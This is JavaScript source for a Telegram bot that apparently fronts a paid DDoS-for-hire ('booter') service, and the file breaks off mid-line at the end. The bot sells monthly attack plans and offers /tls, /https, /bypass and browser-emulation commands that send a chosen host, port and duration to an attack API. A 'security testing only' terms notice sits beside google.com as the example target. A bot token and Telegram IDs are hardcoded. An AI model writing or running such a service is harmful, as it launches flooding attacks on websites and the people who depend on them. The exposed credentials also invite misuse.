const { Telegraf, Markup } = require('telegraf');
const request = require('request');
const fs = require('fs');
const path = require('path');

// ============== CONFIG ==============
const SETTINGS = {
  BOT_NAME: "deathbbos_bot",
  TOKEN: "6304740874:AAH9WKzlNy6FH56I_m3apm22kuMUWEaUzIQ",
  OWNER_TAG: "winterkeith",
  TELEGRAM_LINK: "https://t.me/veccychat",
  TELEGRAM_CHANNEL_ID: "-1002026356494"
};

const ADMIN_ID = "1987642016"; // ADMIN ID
const API_URL = ""; // API DOMAIN (your-api.com)
const BLACK_LIST = ['8.8.8.8', '127.0.0.1']; // BLACKLIST

// ============== DATABASE ==============
let users = [];
let USERS = [
  ['1987642016', 'start', 0, 2], // PLAN DATABASE
];

// ============== ASSETS ==============
const GIFS = {
  WELCOME: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcmxzcnRkb3loaHVmcjBjdTdmM3d2Z2NleGVmdW1zOWI5ZTNmNDdqaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l4JyOCNEfXvVYEqB2/giphy.gif',
  ATTACK: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdGdneGxnMzY5dXhlb2JxNGd0eGg5dWo2OGhoNGp6NGk2Y2d3c3B2bCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7bu4vA6vQ9GfzaKI/giphy.gif',
  SUCCESS: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZnk3YWw4b3hub3l0ZDBuMmhlNGNvenMzazBja214dnBrbnA2MnV5bCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/fRB9j0KCRe0KY/giphy.gif',
  ERROR: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZGNqOHBuenQxc3c3eWdleGQ2d3B4anlzNHEwd2pkajN5aG5lMG41dyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xT5LMzIK1AdZJ4cYW4/giphy.gif',
  PLANS: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaGs3dTFhMHRpeTR1NGkxb3VmMmJxY3N3bzBzNGx6dTFiNHl6NHRlaSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7io5Msw/giphy.gif'
};

// ============== UI ELEMENTS ==============
const mainKeyboard = Markup.keyboard([
  ["🖥 Profile", "💵 Plans"],
  ["🔫 Methods", "🔦 Usage"],
  ["✅ TOS", "⚙️ Commands"],
  ["👤 Support"]
]).resize();

const subscribeKeyboard = Markup.inlineKeyboard([
  [Markup.button.url('🌟 Join Channel', SETTINGS.TELEGRAM_LINK)],
  [Markup.button.callback('✅ Check Subscription', 'check')]
]);

// ============== BOT INITIALIZATION ==============
const bot = new Telegraf(SETTINGS.TOKEN);

// ============== HELPERS ==============
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Format message with emoji decorations and styling
 */
function formatMessage(title, message) {
  return `
╔══════ ${title} ══════╗
${message}
╚════════════════════╝`;
}

// ============== MAIN COMMANDS ==============
bot.command('start', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      if (users.indexOf(ctx.from.id) === -1) {
        users.push(ctx.from.id);
        await bot.telegram.sendMessage(ADMIN_ID, `✨ New user joined: ${ctx.from.id} (${ctx.from.username || 'No username'})`);
      }
      
      await ctx.replyWithAnimation(
        { url: GIFS.WELCOME },
        { caption: formatMessage('WELCOME', `Hello, ${ctx.from.first_name}! 🎉\nWelcome to [${SETTINGS.BOT_NAME}]\n\n📋 Commands list: /help\n🔄 Restart bot: /start`) }
      );
      await ctx.reply('Choose an option:', mainKeyboard);
    } else {
      await ctx.replyWithAnimation(
        { url: GIFS.ERROR },
        { caption: `⚠️ Please join our channel to continue using the bot.` }
      );
      await ctx.reply('Subscribe to continue:', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in start command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.command('help', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('HELP', `
📋 Available Commands:
• /start - Start the bot
• /help - Show this help message
• /id - Show your ID
• Methods commands:
  • /tls <host> <port> <duration>
  • /https <host> <port> <duration>
  • /bypass <host> <port> <duration> [VIP]
  • /browser <host> <port> <duration> [VIP]
  • /browser-vip <host> <port> <duration> [VIP]
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in help command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

// ============== BUTTON HANDLERS ==============
bot.hears('✅ TOS', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('TERMS OF SERVICE', `
1️⃣ Do not attack government websites.
2️⃣ Do not attack critical infrastructure.
3️⃣ Use responsibly and ethically.
4️⃣ You are responsible for your actions.
5️⃣ The service is for security testing only.
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in TOS handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.action('check', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.answerCbQuery('✅ Subscription verified!');
      await ctx.editMessageText('✅ Subscription verified! You can now use the bot.');
      await ctx.reply('Choose an option:', mainKeyboard);
    } else {
      await ctx.answerCbQuery('❌ You have not joined the channel yet.');
      await ctx.reply('⚠️ You need to join our channel to continue.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in check action:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.command('id', async (ctx) => {
  try {
    await ctx.reply(formatMessage('YOUR IDs', `
👤 User ID: ${ctx.from.id}
💬 Chat ID: ${ctx.chat.id}
    `));
  } catch (error) {
    console.error('Error in id command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('⚙️ Commands', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('COMMANDS', `
🚀 Attack Commands:
• /tls <host> <port> <duration>
• /https <host> <port> <duration>
• /bypass <host> <port> <duration> [VIP]
• /browser <host> <port> <duration> [VIP]

ℹ️ Info Commands:
• /help - Show help
• /id - Show your IDs
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in Commands handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('💵 Plans', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.replyWithAnimation(
        { url: GIFS.PLANS },
        { caption: formatMessage('AVAILABLE PLANS', `
🟢 START - [$20 / monthly]
• 2 concurrent attacks
• 160s boot time

🔵 VIP - [$35 / monthly]
• 3 concurrent attacks
• 200s boot time
• VIP methods included

⭐ PREMIUM - [$50 / monthly]
• 5 concurrent attacks
• 400s boot time
• All VIP methods included
• Priority support
        `) }
      );
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in Plans handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('🔫 Methods', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('ATTACK METHODS', `
ℹ️ Usage: /method <HOST> <PORT> <DURATION>
Example: /tls google.com 443 60

📋 Available Methods:
• /https - Standard HTTPS attack
• /tls - TLS attack method
• /bypass - Bypass protection [VIP]
• /browser - Browser simulation [VIP]
• /browser-vip - Advanced browser attack [VIP]
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in Methods handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('🔦 Usage', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('HOW TO USE', `
📝 Command structure:
/method <host> <port> <duration>

🔸 Example:
/tls example.com 443 60

⏱️ Duration is in seconds
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in Usage handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('👤 Support', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (isSubscribed) {
      await ctx.reply(formatMessage('SUPPORT', `
📞 Need help? Contact our support:
👤 @${SETTINGS.OWNER_TAG}

⏱️ Response time: Usually within 24 hours
      `), mainKeyboard);
    } else {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
    }
  } catch (error) {
    console.error('Error in Support handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

// ============== ATTACK COMMANDS ==============
bot.command('tls', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (!isSubscribed) {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
      return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length !== 4) {
      await ctx.reply('❗ Usage: /tls <HOST> <PORT> <DURATION>', mainKeyboard);
      return;
    }
    
    const userId = ctx.from.id;
    const host = args[1];
    const port = parseInt(args[2]);
    const duration = parseInt(args[3]);
    
    // Check if user has active subscription
    const hasVip = await checkVip(userId);
    if (!hasVip) {
      await ctx.reply(`❗ Please buy a subscription from @${SETTINGS.OWNER_TAG}!`, mainKeyboard);
      return;
    }
    
    // Check if user is at their concurrent attacks limit
    const runningAttacks = await getRunConc(userId);
    const maxConcurrent = await getMaxConc(userId);
    if (runningAttacks > maxConcurrent) {
      await ctx.reply(`❗ You can only launch [${maxConcurrent}] simultaneous attacks!`, mainKeyboard);
      return;
    }
    
    // Check max duration
    const maxTime = await getMaxTime(userId);
    if (duration > maxTime) {
      await ctx.reply(`❗ Invalid duration. Your max boot time is ${maxTime} seconds.`, mainKeyboard);
      return;
    }
    
    // Validate port
    if (port < 1 || port > 65536) {
      await ctx.reply("❗ Invalid port! (1-65536)", mainKeyboard);
      return;
    }
    
    // Check blacklist
    if (BLACK_LIST.includes(host)) {
      await ctx.reply("❗ Blacklisted target!", mainKeyboard);
      return;
    }
    
    // Start attack
    await request.get(`https://${API_URL}/api/attack?key=&host=${host}&port=${port}&time=${duration}&method=TCP`);
    await addConc(userId);
    
    await ctx.replyWithAnimation(
      { url: GIFS.ATTACK },
      { caption: formatMessage('ATTACK STARTED', `
🎯 Target: ${host}:${port}
⏱️ Duration: ${duration} seconds
⚡ Method: TLS

Attack is now running...
      `) }
    );
    
    // Wait for attack to complete
    await sleep(duration * 1000);
    
    // Update user's concurrent attacks
    await delConc(userId);
    
    await ctx.replyWithAnimation(
      { url: GIFS.SUCCESS },
      { caption: formatMessage('ATTACK COMPLETED', `
✅ Target: ${host}:${port}
⏱️ Duration: ${duration} seconds
⚡ Method: TLS

Attack has finished successfully!
      `) }
    );
  } catch (error) {
    console.error('Error in tls command:', error);
    await ctx.reply('⚠️ An error occurred while processing your attack request.');
  }
});

// VIP METHOD EXAMPLE
bot.command('browser-vip', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (!isSubscribed) {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
      return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length !== 4) {
      await ctx.reply('❗ Usage: /browser-vip <HOST> <PORT> <DURATION>', mainKeyboard);
      return;
    }
    
    const userId = ctx.from.id;
    const host = args[1];
    const port = parseInt(args[2]);
    const duration = parseInt(args[3]);
    
    // Check if user has VIP plan
    const plan = await getPlan(userId);
    if (plan !== "vip" && plan !== "premium") {
      await ctx.reply('❗ This is a VIP method! Please upgrade your plan.', mainKeyboard);
      return;
    }
    
    // Check if user has active subscription
    const hasVip = await checkVip(userId);
    if (!hasVip) {
      await ctx.reply(`❗ Please buy a subscription from @${SETTINGS.OWNER_TAG}!`, mainKeyboard);
      return;
    }
    
    // Check if user is at their concurrent attacks limit
    const runningAttacks = await getRunConc(userId);
    const maxConcurrent = await getMaxConc(userId);
    if (runningAttacks > maxConcurrent) {
      await ctx.reply(`❗ You can only launch [${maxConcurrent}] simultaneous attacks!`, mainKeyboard);
      return;
    }
    
    // Check max duration
    const maxTime = await getMaxTime(userId);
    if (duration > maxTime) {
      await ctx.reply(`❗ Invalid duration. Your max boot time is ${maxTime} seconds.`, mainKeyboard);
      return;
    }
    
    // Validate port
    if (port < 1 || port > 65536) {
      await ctx.reply("❗ Invalid port! (1-65536)", mainKeyboard);
      return;
    }
    
    // Check blacklist
    if (BLACK_LIST.includes(host)) {
      await ctx.reply("❗ Blacklisted target!", mainKeyboard);
      return;
    }
    
    // Start attack
    await request.get(`https://${API_URL}/api/attack?key=&host=${host}&port=${port}&time=${duration}&method=BROWSER-VIP`);
    await addConc(userId);
    
    await ctx.replyWithAnimation(
      { url: GIFS.ATTACK },
      { caption: formatMessage('VIP ATTACK STARTED', `
🎯 Target: ${host}:${port}
⏱️ Duration: ${duration} seconds
⚡ Method: BROWSER-VIP (Enhanced)

Your VIP attack is now running...
      `) }
    );
    
    // Wait for attack to complete
    await sleep(duration * 1000);
    
    // Update user's concurrent attacks
    await delConc(userId);
    
    await ctx.replyWithAnimation(
      { url: GIFS.SUCCESS },
      { caption: formatMessage('VIP ATTACK COMPLETED', `
✅ Target: ${host}:${port}
⏱️ Duration: ${duration} seconds
⚡ Method: BROWSER-VIP (Enhanced)

Your VIP attack has finished successfully!
      `) }
    );
  } catch (error) {
    console.error('Error in browser-vip command:', error);
    await ctx.reply('⚠️ An error occurred while processing your attack request.');
  }
});

// ============== ADMIN COMMANDS ==============
bot.command('admin', async (ctx) => {
  try {
    if (ctx.from.id.toString() !== ADMIN_ID) {
      await ctx.reply('❗ You do not have administrator rights!', mainKeyboard);
      return;
    }
    
    await ctx.reply(formatMessage('ADMIN PANEL', `
👑 Available commands:

/listusers - Show all users
/adduser <user_id> <plan> - Add a user
/deluser <user_id> - Delete a user
    `));
  } catch (error) {
    console.error('Error in admin command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.command('adduser', async (ctx) => {
  try {
    if (ctx.from.id.toString() !== ADMIN_ID) {
      await ctx.reply('❗ You do not have administrator rights!', mainKeyboard);
      return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) {
      await ctx.reply('❗ Usage: /adduser <user_id> <plan>');
      return;
    }
    
    const userId = args[1];
    const plan = args[2];
    
    await addUser(userId, plan);
    await ctx.reply(`✅ User ${userId} with plan "${plan}" has been added successfully!`);
    
    // Notify the user if they're in the users list
    if (users.includes(userId)) {
      await bot.telegram.sendMessage(
        Number(userId), 
        '🎉 Good news! The administrator has given you access to the bot!'
      );
    }
  } catch (error) {
    console.error('Error in adduser command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.command('deluser', async (ctx) => {
  try {
    if (ctx.from.id.toString() !== ADMIN_ID) {
      await ctx.reply('❗ You do not have administrator rights!', mainKeyboard);
      return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length !== 2) {
      await ctx.reply('❗ Usage: /deluser <user_id>');
      return;
    }
    
    const userId = args[1];
    let userExists = false;
    
    for (let i = 0; i < USERS.length; i++) {
      if (userId === USERS[i][0]) {
        userExists = true;
        break;
      }
    }
    
    if (userExists) {
      await delUser(userId);
      await ctx.reply(`✅ User ${userId} has been successfully removed!`);
    } else {
      await ctx.reply('❗ User not found!');
    }
  } catch (error) {
    console.error('Error in deluser command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.command('listusers', async (ctx) => {
  try {
    if (ctx.from.id.toString() !== ADMIN_ID) {
      await ctx.reply('❗ You do not have administrator rights!', mainKeyboard);
      return;
    }
    
    let usersList = "";
    for (let i = 0; i < USERS.length; i++) {
      if (USERS[i] !== '') {
        usersList += `• ID: ${USERS[i][0]} | Plan: ${USERS[i][1]} | Active: ${USERS[i][2]} | Max: ${USERS[i][3]}\n`;
      }
    }
    
    await ctx.reply(formatMessage('USERS LIST', usersList || 'No users found.'));
  } catch (error) {
    console.error('Error in listusers command:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

bot.hears('🖥 Profile', async (ctx) => {
  try {
    const isSubscribed = await checkSub(ctx.from.id);
    
    if (!isSubscribed) {
      await ctx.reply('⚠️ Please join our channel to continue using the bot.', subscribeKeyboard);
      return;
    }
    
    const userId = ctx.from.id;
    const plan = await getPlan(userId);
    const maxTime = await getMaxTime(userId);
    const isVip = await checkVip(userId);
    
    await ctx.reply(formatMessage('YOUR PROFILE', `
👤 ID: ${userId}
👑 Username: ${ctx.from.username || ctx.from.first_name}
✅ Access: ${isVip ? "Active" : "Inactive"}
📊 Plan: ${plan || "None"}
⏱️ Max boot time: ${maxTime} seconds
    `), mainKeyboard);
  } catch (error) {
    console.error('Error in Profile handler:', error);
    await ctx.reply('⚠️ An error occurred. Please try again later.');
  }
});

// ============== UTILITY FUNCTIONS ==============
/**
 * Get the maximum attack duration for a user
 */
async function getMaxTime(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      if (USERS[i][1] === "start") {
        return 300;
      } else if (USERS[i][1] === "vip") {
        return 600;
      } else if (USERS[i][1] === "premium") {
        return 1200;
      }
    }
  }
  return 0;
}

/**
 * Get the maximum concurrent attacks for a user
 */
async function getMaxConc(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      return USERS[i][3];
    }
  }
  return 0;
}

/**
 * Decrement the concurrent attacks counter for a user
 */
async function delConc(id) {
  try {
    for (let i = 0; i < USERS.length; i++) {
      if (id.toString() === USERS[i][0]) {
        USERS[i][2] = Math.max(0, USERS[i][2] - 1);
        return;
      }
    }
  } catch (error) {
    console.error('Error in delConc:', error);
  }
}

/**
 * Check if the user is subscribed to the channel
 */
async function checkSub(id) {
  try {
    const member = await bot.telegram.getChatMember(SETTINGS.TELEGRAM_CHANNEL_ID, id);
    return ["member", "creator", "administrator"].includes(member.status);
  } catch (error) {
    console.error('Error checking subscription:', error);
    return false;
  }
}

/**
 * Increment the concurrent attacks counter for a user
 */
async function addConc(id) {
  try {
    for (let i = 0; i < USERS.length; i++) {
      if (id.toString() === USERS[i][0]) {
        USERS[i][2] += 1;
        return;
      }
    }
  } catch (error) {
    console.error('Error in addConc:', error);
  }
}

/**
 * Get the number of current attacks for a user
 */
async function getRunConc(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      return USERS[i][2];
    }
  }
  return 0;
}

/**
 * Get the subscription plan for a user
 */
async function getPlan(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      return USERS[i][1];
    }
  }
  return false;
}

/**
 * Check if the user has VIP status
 */
async function checkVip(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      return true;
    }
  }
  return false;
}

/**
 * Add a new user to the database
 */
async function addUser(id, plan) {
  // Set default values based on plan
  let maxConcurrent = 2;
  if (plan === "vip") maxConcurrent = 3;
  if (plan === "premium") maxConcurrent = 5;
  
  // Add the user to the database
  USERS.push([id, plan, 0, maxConcurrent]);
  
  // Notify the user if they're in the active users list
  for (let i = 0; i < users.length; i++) {
    if (id === users[i]) {
      try {
        await bot.telegram.sendMessage(
          Number(id), 
          '🎉 Good news! The administrator has given you access to the bot!'
        );
      } catch (error) {
        console.error('Error notifying user:', error);
      }
      break;
    }
  }
}

/**
 * Remove a user from the database
 */
async function delUser(id) {
  for (let i = 0; i < USERS.length; i++) {
    if (id.toString() === USERS[i][0]) {
      USERS.splice(i, 1);
      return true;
    }
  }
  return false;
}

// ============== START THE BOT ==============
bot.launch().then(() => {
  console.log(`🚀 Bot